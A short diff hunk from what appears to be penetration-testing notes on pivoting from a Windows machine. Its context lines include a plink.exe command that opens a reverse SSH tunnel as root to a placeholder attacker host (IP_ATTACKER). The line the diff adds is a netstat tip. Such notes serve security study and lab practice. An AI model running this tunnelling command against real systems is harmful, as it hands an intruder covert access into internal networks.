@@ -12,4 +12,5 @@ If you have troubles uncomment the Port 22 and change for Port 8888 on file /etc
 * plink.exe -l root -pw YOUR_ROOT_PASSWORD -P 8888 -R PORT:127.0.0.1:PORT IP_ATTACKER
 * y
 
+* netstat -ano (You could try also on your own machine)
 [!] TRY TO USE THE ENTER KEY A COUPLE OF TIMES IN CASE YOU DON'T SEE NOTHING
